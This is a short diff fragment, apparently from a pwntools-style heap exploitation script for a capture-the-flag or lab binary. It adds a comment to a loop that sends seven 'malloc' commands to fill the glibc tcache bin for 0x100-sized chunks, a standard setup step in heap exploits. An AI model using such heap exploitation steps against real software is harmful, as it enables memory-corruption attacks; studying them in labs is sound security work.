@@ -10,6 +10,7 @@ b * free
 
 
 
+# filled up the tcachebin, up to 7 chunks in the size slot of 0x100
 for i in range(0, 7):
 	p.sendline(f"malloc {i} 248")
 
